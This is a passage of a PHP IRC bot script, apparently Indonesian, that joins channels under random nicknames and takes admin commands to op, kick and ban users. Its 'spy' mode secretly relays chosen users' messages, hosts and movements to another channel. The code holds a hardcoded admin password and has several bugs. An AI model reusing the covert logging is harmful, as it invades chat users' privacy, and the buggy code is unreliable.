<?
set_time_limit(0);
define ('CRLF', "\r\n");
#######################################
$logobot=array(
"1(0,1W1,0i0,1_1,0d0,1hy1)",
"1(0,1W1,0i0,1_1,0d0,1hy1)",
"1(0,1W1,0i0,1_1,0d0,1hy1)",
"1(0,1W1,0i0,1_1,0d0,1hy1)",
"1(0,1W1,0i0,1_1,0d0,1hy1)",
"1(0,1W1,0i0,1_1,0d0,1hy1)",
"1(0,1W1,0i0,1_1,0d0,1hy1)",
"12(0,12W12,0i0,12_12,0d0,12hy12)",
"12(0,12W12,0i0,12_12,0d0,12hy12)",
);
$nickbot=array("tante-jamela", "jamela-hot", "janda-perawan", "cewek`sweetY-", "Cwe-ganas", "Cwe-mau", "Cwe-hotZZ", "GANK-DOLY", "G4di5ku-5jt", "G4di5ku-4jt",
"G4di5ku-3jt", "G4di5ku-2jt", "G4di5ku-1jt", "Zakia_hotZZ", "-ce`ManjaA", "ce^gresikAN-", "ArekSMA12-", "-KepalaDesaKU", "^-KagomeME", "K-imi_No_YumeE", "-Ut[a]da_hi[k]aruE",
"ErrChanE-", "dhaniE-", "tia-ra-21E", "mai_kur-akiE", "-brontokE", "C-onanE", "do-ra_sedihE", "B-unda_Noer_a-iniE", "B--Yuk^JrE", "-con[a]n`xsE", "A-RiiseE-", "Lam-pardE",
"ZumiZolaE-", "C-ontiex`sE", "s-h[a]nieE", "[A]ntIE-", "a-RielE", "-armYE", "L-2-MasE", "N-[-]CusE", "F-[and]IE", "M-r_Tom`CruiseE", "-E-mailE", "E--rixE", "E-o-neE", "sh-epthyE",
"Sry-`nTeallE", "Fan7k-aE", "M-ill``Ac-hE", "V-Th-reeE", "G-Da-nkE", "Di-e[a]chE", "-Phia`eE", "T-CoolE-", "L3i-li3E", "-ilham_JK^n2tE", "-WikeE", "J-ar-os^JrE", "-Wo^[a]i-niE",
"Me2-TE-", "-B-ud2E", "-Ci-2KE", "E-Ch-o^e-E", "-O2-cE", "-Iy[o-o]edE", "-R--elfE", "-[Y-]u[S]tE", "-V-E``Th-[a]E", "-Mr_Supe-rmanE", "-Mrs_DoraE", "-Mr_ShamoHungE", "-Mrs_Am-pereE", "-Mr_Tukul-E", 
"-Mr_Sol-arE", "-Mr_P-atekulE", "Mr_Tour-reE", "Mr-s_OliefE", "Ketu-pat^[GENDUT]E", "[B]-ungahE", "[S]ida-yuE", "cece-p`sE", "[R]a-ja[T]egaE", "T-inaToonE", "kop-[r]alEE", "Sim-a`SEE", 
"Mb[-o_o]leEtEE", "Mar-rieEEE", "[L]-eaEE", "chil[isEE", "The[[D]octor|II7|EE", "Antar_[Kau_Dan_AkuEE", "musa[ddadEE", "danny[[Z]EE", "Skbe[r_BoyEE", "mari[anaEE", "mela[ratE", "Cow[P][ilekkkkE", 
"ce[^_^suka_Keta[waGenitE", "[Bo[t]ulismE", "Franc[issellu_Tula[rensisE", "Chair[ilAnwarE", "Aku_ini[-Binatang_jalangE", "S[elamat_jln_TemanE", "Pak^hajiE", "Bu-GuruE", "HanaE", 
"korupt[oooo]rE", "masudaEE", "[R]anE", "[S]hinichiE", "kindaiciE", "pak-sbyE", "[J]agungE", "[C]hilucE", "aisyahE",
"simPATIE","JemPolE","K-artuASE","A-ditE","Hen-drikE","X-lE","F-renE","Im-3E","Mentar-iE","WhoA-mIE","Kiror-oE","SpEEd-_HUnTERE","Her-o`sE"
);

$identbot=array("Widhy"
);

$realbot=array("whois whois... culek sisan....",
	       "3Powered B3y 3Wid3hy",
	       "4Powered B4y 4Wid4hy",
	       "13&#10084;10[12iWIDHY4&#10084;13Smile10]13&#10084;"
);
$helpbot = array($logobot[rand(0,count($logobot) - 1)]." - RuNNINg WiTH PHpBoT bY -=TRENGGALEK@crEw=-",
		"IRC COMMAND..!",
	       "12^Login <password> 4- 2Login To Bot",
	       "12^Logout 4- 2Logout From Bot",
	       "12.Up 4- 2Op Bot",
	       "12.Down 4- 2Deop Bot",
	       "12.O |#chan| <nick> 4- 2Op Spesifik Nick",
	       "12.Do |#chan| <nick> 4- 2DeOp Spesifik Nick",
	       "12.H |#chan| <nick> 4- 2HalfOp Spesifik Nick",
	       "12.Dh |#chan| <nick> 4- 2DeHalfOp Spesifik Nick",
	       "12.V |#chan| <nick> 4- 2Voice Spesifik Nick",
	       "12.Dv |#chan| <nick> 4- 2DeVoice Spesifik Nick",
	       "12.K |#chan| <nick> |msg| 4- 2Kick Spesified Nick",
	       "12.Kc |#chan| <nick> |msg| 4- 2Kick Spesified Nick (ChanServ Stuf)",
	       "12.Kb |#chan| <nick> |msg| 4- 2KickBan Spesified Nick",
	       "12.B |#chan| <nick|hostmask> 4- 2Ban Nick Or Hostmass",
	       "12.Ub |#chan| <nick|hostmask> 4- 2UnBan Nick Or Hostmass",
	       "12.J <#chan> 4- 2Join Specified Channel",
	       "12.P <#chan> |msg| 4- 2Part Specified Channel",
	       "12.Cy <#chan> |msg| 4- 2Cycle On Specified Channel",
	       "12.N <newnick> 4- 2Change Nick",
	       "12.S |#chan/nick| <msg> 4- 2Msg Channel Or Person",
	       "12.A |#chan/nick| <text> 4- 2Action With Spesified Text",
	       "12.Q <msg> 4- 2Kill Bot",
	       "SYSTEM COMMAND..!",
	       "12.Server <server> 4- 2Push Bot To Use Spec Server",
	       "12.Servpass <password> 4- 2Use Spec Server Password",
	       "12.Ident <identify> 4- 2Changing Bot Ident",
	       "12.Realname <realname> 4- 2Changing Bot Realname",
	       "12.Jump 4- 2Restarting bot also Accept Setting",
	       "12.Autoaway <on/off> 4- 2On/Off Auto Away",
	       "12.Userlist 4- 2List Of User",
		"4Powered B4y 4Widhy");
######################################
//########### CONFIG BOT #############
$bot['nick']=$nickbot[rand(0,count($nickbot) - 1)];
$bot['ident']=$identbot[rand(0,count($identbot) - 1)];
$bot['realname']=$realbot[rand(0,count($realbot) - 1)];
$bot['pnick']="passwordnick";
$bot['chan']="#Fadhli";

$bot['local']="local";

$bot['server']="irc.cbn.net.id";
$bot['port']=6667;
$bot['userver']=0;
$bot['pserver']="remotepass";

$bot['admin']="diccky";
$bot['pass']="zone";

$Admin=strtolower($bot['admin']);
$BOT_PASSWORD=strtolower($bot['pass']);
$auth = array($Admin => array("name" => $Admin, "pass" => $BOT_PASSWORD, "auth" => 1,"status" => "Admin"));
$zodiak = array("capricorn", "aquarius", "pisces", "aries", "taurus", "gemini", "cancer", "leo", "virgo", "libra", "scorpio", "sagitarius");

############## END #################


############# CONNECT TO IRC #########################################
$keluar=0;
$servdef=array("irc.cbn.net.id","irc.telkom.net.id","irc.sbp.net.id","irc.plasa.com","irc.indowebster.com","irc.indo.net.id","irc.power.net.id","irc.boleh.com","irc.citra.net.id");
$retry=count($servdef)+1;
$attconnect=0;
$rtdc=0;
$isaway=false;
$autoaway=false;
$tmaway="";
$dmaway="";
$idaway=0;
$mylistson="";

$warnaboom="Merah;Kuning;Hijau;Ungu;Coklat;Hitam;Putih;Abu-abu;Emas;Silver;Maroon;Jingga;Orange";
$smsx['host']="sexylingerie.110mb.com";
$smsx['port']=80;
$smsx['path']="http://sexylingerie.110mb.com/sms.php";
//$smsx['host']="localhost";
//$smsx['path']="http://localhost/sms.php";
$timeboom=20;
$user_chan_arr[][]="";
$ctcpversi="13&#10084;10[12WIDHY4&#10084;13cakep10]13&#10084;";
$banlist["chan"]="";
$spynick["nick"]="";
$spychan["chan"]="";
$sysspy="off";
$greetmsg["nick"]["nama"]="";
$greetmsg["nick"]["msg"]="";
$sysgreet="off";
$ping["ping"]["nick"]="";
$ping["ping"]["chan"]="";
$sysping="off";
$sysversi="off";
$sysjoinonkick="off";
$sysspoof="off";
$sysastro="off";
$syssms="off";
do {


$fp = fsockopen($bot['server'],$bot['port'], &$err_num, &$err_msg, 30);
if(!$fp) {
	$attconnect++;
	print "Sorry, the server " . $bot['server']. " is not currently available!";
	$bot['server']=$servdef[$attconnect-1];
	$bot['userver']=0;
	sleep(5);
	if ($attconnect >=$retry){
		$keluar=1;
		exit;
	}
}
else{
	foreach ($user_chan_arr as $cur_xchan) {
		$res_chan=$res_chan.';'.$cur_xchan["chan"];
	}
	unset($user_chan_arr);
	$user_chan_arr[][]="";
	$goboom=0;
	$onboom="off";
	$targetboom="";
	$rtdc++;
	if($rtdc ==3){
		$bot['userver']=0;
		
	}
	elseif($rtdc >=4){
		$bot['ident']="el`Spirit";
		$bot['userver']=0;
		$rtdc=0;
	}
	$attconnect=0;
	if ($bot['userver']==1){
		$Header = 'PASS ' . $bot['pserver'] . CRLF;
	}
	$Header .= 'NICK ' . $bot['nick'] . CRLF;
	$Header .= 'USER ' . $bot['ident'] . ' ' . $bot['local'] . ' ' . $bot['server'] . ' :' . $bot['realname'] . CRLF;

	fputs($fp, $Header);
		$response = '';
		
		while (!feof($fp)) {
			$response = fgets($fp, 1024);
			///###timer##//
			$ctime = time();
			$isonuptime = $ctime - $stime;
			if ($isonuptime>=15) {
				if(!$isonaway){
					$stime=time(); $isonuptime=0; $isonaway=true;
					if ($sysison=="on"){
						$sendison=str_replace(";"," ",$mylistson);  fputs($fp,'ISON ' . $sendison . CRLF);
					}
				}
			}
			if ($isonuptime<15){
				$isonaway=false;
			}
			///////////////
			if($onboom=="on" && $sysboom="on"){
				$tboom=time()-$tmboom;
				if($tboom>=$timeboom){

					fputs($fp, 'PRIVMSG CHANSERV :KICK '.$chanboom.' '. $targetboom.' 0,4Waktu Habis... BOOOOOOMMMM!!!!!'  . CRLF);
					fputs($fp, 'KICK '.$chanboom.' '. $targetboom.' :0,4Waktu Habis... BOOOOOOMMMM!!!!!'  . CRLF);
					$goboom=0;
					$onboom="off";
					$targetboom="";
				}
			}
			while (substr_count($response,CRLF) != 0) {
				$offset = strpos($response, CRLF);
				$DataLine = substr($response,0,$offset);
				if (substr($DataLine,0,1) == ':') {
					#####TIMER#####
					$mtimer=date("i");
					$dtimer=date("s");
					if($autoaway){
					if($mtimer!=$tmaway){
						if(!$isaway && $idaway >= 30){
						fputs($fp, 'AWAY :away '.$logobot[rand(0,count($logobot) - 1)].  CRLF);
						$tmaway=$mtimer;
						$idaway=0;
						}
					}
					if($dtimer!=$dmaway && !$isaway){
						if($idaway>=32){$idaway=30;}
						$idaway++;
						$dmaway=$dtimer;
					}
					}
					###END TIMER###
					$Params=explode(" ",$DataLine);
					$offsetC = strpos($DataLine, ' :');
					$dText = substr($DataLine,$offsetC+2);
					if ((strpos($Params[0],"!")!=0) && (strpos($Params[0],"@")!=0) ) {
						$fsrc[nick]=substr($Params[0],1,strpos($Params[0],"!")-1);
						$fsrc[nkecil]=strtolower($fsrc[nick]);
						$fsrc[user]=substr($Params[0],strpos($Params[0],"!")+1,(strpos($Params[0],"@")-strpos($Params[0],"!"))-1);
						$fsrc[host]=substr($Params[0],strpos($Params[0],"@")+1);
					}
					################## RAW ##################
					if ( $Params[1] == '001' ) {
						$bot['nick']=$Params[2];
						$rtdc=0;
					}
					elseif ( $Params[1] == '004' ) {
						fputs($fp, 'PING 1476786f'. CRLF);
						fputs($fp, 'PRIVMSG Nickserv :identify '.$bot['pnick'].  CRLF);
						fputs($fp,'JOIN ' . $bot['chan'] . CRLF);
						if($res_chan){
							$arres_chan=explode(";",$res_chan);
							foreach ($arres_chan as $clist){
								fputs($fp,'JOIN ' . $clist . CRLF);
								sleep(1);
							}
						}
					}
					elseif ($Params[1]=='303') {
						fputs($fp, 'PING 876786f'. CRLF);
						$listson=strtolower($dText);
						$xpgetison=explode(" ",$listson);
						$i=0;
						$jmlolol=0;
						foreach ($xpgetison as $pgetlist){
							if($pgetlist<>""){
								$i++;
								$sonson[$i]=$pgetlist;
								$jmlolol=$i;
							}
						}
						$i=0;
						$mylistson=$mylistson . ';';
						$xpgetison=explode(";",$mylistson);
						$mylistson=ltrim($mylistson,";");
						$mylistson=str_replace(";;","",$mylistson);
						$mylistson=rtrim($mylistson,";");
						foreach ($xpgetison as $pgetlist){
							if ($pgetlist<>""){
								$i++;
								$lsonson[$i]=$pgetlist;
								$jmlson=$i;
							}
						}
						$dafonline="";
						$dafoffline="";
						for ($i = 1; $i <= $jmlson; $i++) {
							$satup=$lsonson[$i];
							$ds=0;
							for ($p = 1; $p <= $jmlolol; $p++) {
								if ($satup==$sonson[$p]){
									$ds=1;
								}
							}
							if ($ds==1){
								if(!$ada1["$satup"]){
									$dafonline .=$satup.' ';
									$ada1["$satup"]=true;
									$ada2["$satup"]=false;
								}
							}
							else{
								if(!$ada2["$satup"]){
									$dafoffline .=$satup.' ';
									$ada2["$satup"]=true;
									$ada1["$satup"]=false;
								}
							}
						}
						$dafonline=ltrim($dafonline);
						$dafonline=rtrim($dafonline);
						$dafoffline=ltrim($dafoffline);
						$dafoffline=rtrim($dafoffline);
						if ($dafonline){
							fputs($fp, 'PRIVMSG '. $chanson .' :15(04Ison15) On IRC : '.$dafonline . CRLF);
						}
						if ($dafoffline){
							fputs($fp, 'PRIVMSG '. $chanson .' :15(04Ison15) Left IRC : '.$dafoffline . CRLF);
						}
						unset($lsonson);
						unset($sonson);
					}
					elseif ( $Params[1] == '305' ) {
						$isaway=false;
					}
					elseif ( $Params[1] == '306' ) {
						$isaway=true;
					}
					elseif ( $Params[1] == '353' ) {
						$nickll=str_replace("@","",$dText);
						$nickll=str_replace("&","",$nickll);
						$nickll=str_replace("%","",$nickll);
						$nickll=str_replace("+","",$nickll);
						unset($user_chan_arr[strtolower($Params[4])]);
						$user_chan_arr[strtolower($Params[4])]["nick"]=' '.$nickll.' ';
						$user_chan_arr[strtolower($Params[4])]["chan"]=strtolower($Params[4]);
					}
					elseif ( $Params[1] == '367' ) {
						fputs($fp, 'NOTICE '.$banlist["$Params[3]"]. ' :4[3+b4] 1- 3'.$Params[4].''.  CRLF);
					}
					elseif ( $Params[1] == '368' ) {
						fputs($fp, 'NOTICE '.$banlist["$Params[3]"]. ' :4E1nd 4o1f 4c1hannel 4b1an 4l1ist'.  CRLF);
						unset($banlist["$Params[3]"]);
					}
					elseif ( $Params[1] == '432' || $Params[1]=='433' ) {
						$strnick = '';
						for ($i=1; $i<=4; $i++){
						$set = array(rand (65,90),rand(97,122));
						$strnick .= chr($set[rand(0,1)]);
						}
						fputs($fp,'NICK ' . $bot['nick'] .'[' . $strnick .']'  . CRLF);
					}
					elseif ( $Params[1] == '465' || $Params[1]=='464' ) {
						$bot['userver']=0;
					}
					elseif ( $Params[1] == 'NICK' ){
						$newnicke = str_replace(':','',$Params[2]);
						if(strtolower($fsrc[nick])==strtolower($bot['nick'])){
						$bot['nick']=$newnicke;
						}
						$fsrc[nkecil]=strtolower($fsrc[nick]);
						if ($auth["$fsrc[nkecil]"]) {
							if ($auth["$fsrc[nkecil]"]["pass"]) {
								if ($auth["$fsrc[nkecil]"]["auth"]==2) {
									$chnick = strtolower(str_replace(':','',$Params[2]));
									if ($fsrc[nkecil]!=$chnick) {
									$auth["$fsrc[nkecil]"]["auth"] = 1;
									fputs($fp,'PRIVMSG '.$chnick.' :You`re LogOut On Change Nick!' . CRLF);
									}
								}
							}
						}
						foreach ($user_chan_arr as $cur_xchan) {
							$x_chan=$cur_xchan["chan"];
							$user_chan_arr[strtolower($x_chan)]["nick"]=str_replace(' '.$fsrc[nick].' ',' '.$newnicke.' ',$user_chan_arr[strtolower($x_chan)]["nick"]);
							$user_chan_arr[strtolower($x_chan)]["nick"]=str_replace(' ',' ',$user_chan_arr[strtolower($x_chan)]["nick"]);
						}
						///////////////
						if($sysspy=="on"){
							$sppp=true;
							if(strtolower($bot[nick])==$fsrc[nkecil]){$sppp=false;}
							$notspy=false;
							if ($auth["$fsrc[nkecil]"]) {
								if ($auth["$fsrc[nkecil]"]["pass"]) {
									$notspy=true;
								}
							}
							if($notspy){$sppp=false;}
							if(strtolower($spynick["$fsrc[nkecil]"])==$fsrc[nkecil] && $sppp){
								fputs($fp,'PRIVMSG ' . $spychan["chan"] . ' :15(04Log15) 3* '.$fsrc[nick] .' is now known as '. str_replace(':','',$Params[2]) . CRLF);
							}


						}
						/////////////////
						if($onboom=="on"){
							if(strtolower($fsrc[nkecil])==strtolower($targetboom)){
								fputs($fp, 'PRIVMSG CHANSERV :KICK '.$chanboom.' '. $newnicke.' 0,4Ups! BOOOOOOMMMM!!!!!'  . CRLF);
								fputs($fp, 'KICK '.$chanboom.' '. $newnicke.' :0,4Ups! BOOOOOOMMMM!!!!!'  . CRLF);
								$goboom=0;
								$onboom="off";
								$targetboom="";
							}
						}
					}
					elseif ( $Params[1] == 'PART' ){
						$fsrc[nkecil]=strtolower($fsrc[nick]);
						if ($auth["$fsrc[nkecil]"]) {
							if ($auth["$fsrc[nkecil]"]["pass"]) {
								if ($auth["$fsrc[nkecil]"]["auth"]==2) {
								$auth["$fsrc[nkecil]"]["auth"] = 1;
								fputs($fp,'PRIVMSG '.$fsrc[nick].' :You`re LogOut On Parting Channel!' . CRLF);
								}
							}
						}
						if($fsrc[nkecil]==strtolower($bot['nick'])){
							unset($user_chan_arr[strtolower($Params[2])]);
						}
						else{
						$user_chan_arr[strtolower($Params[2])]["nick"]=str_replace(' '.$fsrc[nick].' ',' ',$user_chan_arr[strtolower($Params[2])]["nick"]);
						$user_chan_arr[strtolower($Params[2])]["nick"]=str_replace("  "," ",$user_chan_arr[strtolower($Params[2])]["nick"]);
						}
						///////////////
						if($sysspy=="on"){
							$sppp=true;
							if(strtolower($bot[nick])==$fsrc[nkecil]){$sppp=false;}
							$notspy=false;
							if ($auth["$fsrc[nkecil]"]) {
								if ($auth["$fsrc[nkecil]"]["pass"]) {
									$notspy=true;
								}
							}
							if($notspy){$sppp=false;}
							if ( substr(strtolower($Params[3]),0,7)==":^login") {$sppp=false; }
							if ( strtolower($Params[2])==strtolower($spychan["chan"])) {$sppp=false; }
							if(strtolower($spynick["$fsrc[nkecil]"])==$fsrc[nkecil] && $sppp){
								if($dText==""){
								fputs($fp,'PRIVMSG ' . $spychan["chan"] . ' :15(04Log15) 3* '.$fsrc[nick] .' ('.$fsrc[user].'@'.$fsrc[host].') has left '.$Params[2] . CRLF);
								}
								else{
								fputs($fp,'PRIVMSG ' . $spychan["chan"] . ' :15(04Log15) 3* '.$fsrc[nick] .' ('.$fsrc[user].'@'.$fsrc[host].') has left '.$Params[2] .' ('.$dText.')' . CRLF);
								}
							}


						}
						/////////////////
					}
					elseif ( $Params[1] == 'JOIN' ){
						$fsrc[nkecil]=strtolower($fsrc[nick]);
						if($fsrc[nkecil]==strtolower($greetmsg["$fsrc[nkecil]"]["nama"]) && $sysgreet=="on"){
							$rndgreet=explode("[NG]",$greetmsg["$fsrc[nkecil]"]["msg"]);
							$msgrndgreet=$rndgreet[rand(0,count($rndgreet) - 1)] ;
							$addchan=str_replace(":","",$Params[2]);
							$msgnya=str_replace("<|nick|>",$fsrc[nick],$msgrndgreet);
							$msgnya=str_replace("<|chan|>",$addchan,$msgnya);
							fputs($fp, 'PRIVMSG '. $addchan .' :'.$msgnya . CRLF);
						}
						$addchan=str_replace(":","",$Params[2]);
						$user_chan_arr[strtolower($addchan)]["nick"] = $user_chan_arr[strtolower($addchan)]["nick"].' '.$fsrc[nick]. ' ';
						$user_chan_arr[strtolower($addchan)]["nick"]=str_replace("  "," ",$user_chan_arr[strtolower($addchan)]["nick"]);
						
						///////////////
						if($sysspy=="on"){
							$sppp=true;
							if(strtolower($bot[nick])==$fsrc[nkecil]){$sppp=false;}
							$notspy=false;
							if ($auth["$fsrc[nkecil]"]) {
								if ($auth["$fsrc[nkecil]"]["pass"]) {
									$notspy=true;
								}
							}
							if($notspy){$sppp=false;}
							if ( strtolower(str_replace(":","",$Params[2]))==strtolower($spychan["chan"])) {$sppp=false; }
							if(strtolower($spynick["$fsrc[nkecil]"])==$fsrc[nkecil] && $sppp){
								fputs($fp,'PRIVMSG ' . $spychan["chan"] . ' :15(04Log15) 3* '.$fsrc[nick] .' ('.$fsrc[user].'@'.$fsrc[host].') has joined '.str_replace(":","",$Params[2]) . CRLF);
							}
					        }
						/////////////////
					}
					elseif ( $Params[1] == 'KICK' ){
						if(strtolower($bot['nick'])==strtolower($Params[3])){
							if($sysjoinonkick=='on'){
								sleep(1);
								fputs($fp, 'PRIVMSG Chanserv :UNBAN '.$Params[2].' '.$bot['nick'] . CRLF);
								sleep(1);
								fputs($fp, 'JOIN '. $Params[2] . CRLF);
							}
							unset($user_chan_arr[strtolower($Params[2])]);
						}
						$user_chan_arr[strtolower($Params[2])]["nick"]=str_replace(' '.$Params[3].' ',' ',$user_chan_arr[strtolower($Params[2])]["nick"]);
						$user_chan_arr[strtolower($Params[2])]["nick"]=str_replace("  "," ",$user_chan_arr[strtolower($Params[2])]["nick"]);
						
						///////////////
						if($spyspy=="on"){
							$sppp=true;
							if(strtolower($bot[nick])==strtolower($Params[3])){$sppp=false;}
							$notspy=false;
							if ($auth[strtolower($Params[3])]) {
								if ($auth[strtolower($Params[3])]["pass"]) {
									$notspy=true;
								}
							}
							if($notspy){$sppp=false;}
							if(strtolower($spynick[strtolower($Params[3])])==strtolower($Params[3]) && $sppp){
								if($dText){
								fputs($fp,'PRIVMSG ' . $spychan["chan"] . ' :15(04Log15) 3* '.$Params[3].' was kicked by '.$fsrc[asli] .' ('.$dText.')' . CRLF);
								}
								else{
								fputs($fp,'PRIVMSG ' . $spychan["chan"] . ' :15(04Log15) 3* '.$Params[3].' was kicked by '.$fsrc[asli] . CRLF);
								}
							}
						}
						/////////////////
					}
					elseif ( $Params[1] == 'QUIT' ){
						$fsrc[nkecil]=strtolower($fsrc[nick]);
						$auth["$fsrc[nkecil]"]["auth"] = 1;

						foreach ($user_chan_arr as $cur_xchan) {
							$x_chan=$cur_xchan["chan"];
							$user_chan_arr[$x_chan]["nick"]=str_replace(' '.$fsrc[nick].' ',' ',$user_chan_arr[$x_chan]["nick"]);
							$user_chan_arr[$x_chan]["nick"]=str_replace(' ',' ',$user_chan_arr[$x_chan]["nick"]);
						}
						///////////////
						if($sysspy=="on"){
							$sppp=true;
							if(strtolower($bot[nick])==$fsrc[nkecil]){$sppp=false;}
							$notspy=false;
							if ($auth["$fsrc[nkecil]"]) {
								if ($auth["$fsrc[nkecil]"]["pass"]) {
									$notspy=true;
								}
							}
							if($notspy){$sppp=false;}
							if(strtolower($spynick["$fsrc[nkecil]"])==$fsrc[nkecil] && $sppp){
								if($dText){
									fputs($fp,'PRIVMSG ' . $spychan["chan"] . ' :15(04Log15) 2* '.$fsrc[nick] .' ('.$fsrc[user].'@'.$fsrc[host].') Quit ('.$dText.')' . CRLF);
								}else{
								fputs($fp,'PRIVMSG ' . $spychan["chan"] . ' :15(04Log15) 2* '.$fsrc[nick] .' ('.$fsrc[user].'@'.$fsrc[host].') Quit' . CRLF);
								}
							}
						}
						/////////////////
						if($onboom=="on"){
							if(strtolower($fsrc[nkecil])==strtolower($targetboom)){
								$goboom=0;
								$onboom="off";
								$targetboom="";
							}
						}
					}
					elseif ( $Params[1] == 'NOTICE' ){
						if($Params[3]==':VERSION'){
							if($datversi[strtolower($fsrc[nick])]["nick"]==strtolower($fsrc[nick])){
								$vernya=str_replace(chr(1),"",$dText);
								$vernya=substr($vernya,8);
								fputs($fp, 'PRIVMSG '. $datversi[strtolower($fsrc[nick])]["chan"].' :15(04Info15) 7'.$fsrc[nick].' '.$vernya.  CRLF);
							}

							unset($datversi[strtolower($fsrc[nick])]["nick"]);
							unset($datversi[strtolower($fsrc[nick])]["chan"]);
						}
						if($Params[3]==':PING'){
							$dataping=str_replace(chr(1),"",$Params[4]);
							$dataping=str_replace("\r","",$dataping);
							$dataping=str_replace("\n","",$dataping);
							$dataping=str_replace("","",$dataping);
							if ($ping["$dataping"]["ping"]==$dataping){
								$pong = time();
								$pptime = $pong - $dataping;
								$meni = "";
								if ($pptime>=60) {
									$bag = $pptime / 60;
									$meni = floor($bag)."mins ";
									$sis = $pptime - ($meni*60);
									$pptime = $sis;
								}
								$deti = $pptime."secs";
								$pptime = "$meni$deti";
								fputs($fp,'PRIVMSG '.$ping["$dataping"]["chan"].' :15(pong04!15) Lag RepLy Bwt '.$fsrc[nick].' : '.$pptime . CRLF);
							}
							unset($ping["$dataping"]);
						}
						
					}
					elseif ($Params[1]== 'PRIVMSG' ) {
						$TxtMsg=substr($DataLine,strpos($DataLine," :")+2);
						$dCom=explode(" ", $TxtMsg);
						$isuser=false;$islogin=false;

						$fsrc[nkecil]=strtolower($fsrc[nick]);
						
						if($sysspy=="on"){
							$sppp=true;
							if(strtolower($bot[nick])==$fsrc[nkecil]){$sppp=false;}
							$notspy=false;
							if ($auth["$fsrc[nkecil]"]) {
								if ($auth["$fsrc[nkecil]"]["pass"]) {
									$notspy=true;
								}
							}
							if($notspy){$sppp=false;}
							if ( substr(strtolower($Params[3]),0,7)==":^login") {$sppp=false; }
							if ( strtolower($Params[2])==strtolower($spychan["chan"])) {$sppp=false; }
							if(strtolower($spynick["$fsrc[nkecil]"])==$fsrc[nkecil] && $sppp){
								if ( $Params[3]==":PING") {
									fputs($fp,'PRIVMSG ' . $spychan["chan"] . ' :15(04Log15) 4['.$fsrc[nick].' PING]' . CRLF);
								}
								elseif ($Params[3]==":VERSION") {
									fputs($fp,'PRIVMSG ' . $spychan["chan"] . ' :15(04Log15) 4['.$fsrc[nick].' VERSION]' . CRLF);
								}
								elseif ($Params[3]==":TIME") {
									fputs($fp,'PRIVMSG ' . $spychan["chan"] . ' :15(04Log15) 4['.$fsrc[nick].' TIME]' . CRLF);
								}
								elseif ($Params[3]==":ACTION") {
									fputs($fp,'PRIVMSG ' . $spychan["chan"] . ' :15(04Log15) 15(4'.$fsrc[nick].' '.$Params[2]. '15) 6'.$fsrc[nick].' ' . rtrim(substr($TxtMsg,8),"").'' . CRLF);
								}
								else{
								fputs($fp,'PRIVMSG ' . $spychan["chan"] . ' :15(04Log15) 15(4'.$fsrc[nick].' '.$Params[2]. '15) '  . str_replace("","",$TxtMsg) . CRLF);
								}
							}
						}
						
						if ($auth["$fsrc[nkecil]"]) {
      			                 	if ($auth["$fsrc[nkecil]"]["pass"]) {
					            $isuser=true;
								if ($auth["$fsrc[nkecil]"]["auth"]==2) {
								$islogin=true;
								}
                  				}
						}
						
						############# INFO CLIENT ####################
						if ( $Params[3]==":PING") {
							fputs($fp,'NOTICE ' . $fsrc[nick] . ' :' . $TxtMsg . CRLF);
						}
						elseif ($Params[3]==":VERSION") {
    							fputs($fp,'NOTICE ' . $fsrc[nick] . ' :' . chr(1) . 'VERSION '. $ctcpversi . chr(1) . CRLF);
   						}
   						elseif ($Params[3]==":TIME") {
                                		$timetoday = date("D M j H:i:s Y");
    							fputs($fp,'NOTICE ' . $fsrc[nick] . ' :' . chr(1) . 'TIME '.$timetoday . chr(1) . CRLF);
   						}
						########### END INFO CLIENT #####################
						

						############# Params Command Master ###########
						elseif (substr($Params[3],0,2)==':^' && $isuser){
							if ($auth["$fsrc[nkecil]"]["status"] && strtolower($dCom[0])=="^login" && $dCom[1]) {
								if ($auth["$fsrc[nkecil]"]["auth"]==1) {
								if ($dCom[1]===$auth["$fsrc[nkecil]"]["pass"]) {
								$auth["$fsrc[nkecil]"]["auth"] = 2;
								fputs($fp,'PRIVMSG ' . $fsrc[nick] . ' :You`re Authorized as '.$auth["$fsrc[nkecil]"]["status"].' of this bot! ' . CRLF);
								}
								} else { fputs($fp,'PRIVMSG ' . $fsrc[nick] . ' :You`re Already Authorized!' . CRLF); }
							}
							elseif ($auth["$fsrc[nkecil]"]["status"] && strtolower($dCom[0])=='^logout' && $islogin) {
								if ($auth["$fsrc[nkecil]"]["pass"]) {
								if ($auth["$fsrc[nkecil]"]["auth"]==2) {
									$auth["$fsrc[nkecil]"]["auth"] = 1;
									fputs($fp,'PRIVMSG ' . $fsrc[nick] . ' :You`re LogOut! ' . CRLF);
								}
								}
							}
						}
						elseif (substr($Params[3],0,2)==':.' && $islogin ){
							$stauth=0;
							$stboth=0;
							$idaway=0;
							$comcom=$dCom[0];
							$dCom[0]=strtolower($dCom[0]);
							if($isaway){fputs($fp,'AWAY'. CRLF);$isaway=false;}
							if ($auth["$fsrc[nkecil]"]["status"]=="user"){$stauth=3;}
							elseif ($auth["$fsrc[nkecil]"]["status"]=="master"){$stauth=2;}
							elseif (strtolower($auth["$fsrc[nkecil]"]["status"])=="admin"){$stauth=1;}
							if($stauth==2 || $stauth==1){$stboth=1;}
							if (ereg('#',$Params[2])){$cmdin=1;}else {$cmdin=0;}
							
							if ($auth["$fsrc[nkecil]"]["status"] && $dCom[0]=='.chgpass' && $dCom[1] && $dCom[2] && $islogin) {
								if ($auth["$fsrc[nkecil]"]["auth"]==2) {
								if ($dCom[1]===$auth["$fsrc[nkecil]"]["pass"]) {
									$auth["$fsrc[nkecil]"]["pass"] = $dCom[2];
									fputs($fp,'PRIVMSG ' . $fsrc[nick] . ' :Your New Auth Pass set to '.$auth["$fsrc[nkecil]"]["pass"].' ' . CRLF);
								} else { fputs($fp,'PRIVMSG ' . $fsrc[nick] . ' :Your Old Pass Wrong! Type: .Chgpass <old pass> <new pass> To Change Your Auth Pass ' . CRLF); }
								}
							}
							elseif ($auth["$fsrc[nkecil]"]["status"] && $dCom[0]=='.adduser' && $dCom[1] && $dCom[1]!=$bot['nick'] && $dCom[2] && $dCom[3] && $islogin) {
								$dCom[1] = strtolower($dCom[1]);
								$dCom[3] = strtolower($dCom[3]);
								if ($auth["$fsrc[nkecil]"]["auth"]==2) {
									if ($auth["$fsrc[nkecil]"]["status"]=="Admin") {
										if ($dCom[3]=="master" || $dCom[3]=="user") {
											$auth["$dCom[1]"]["name"] = $dCom[1];
											$auth["$dCom[1]"]["pass"] = $dCom[2];
											$auth["$dCom[1]"]["status"] = $dCom[3];
											$auth["$dCom[1]"]["auth"] = 1;
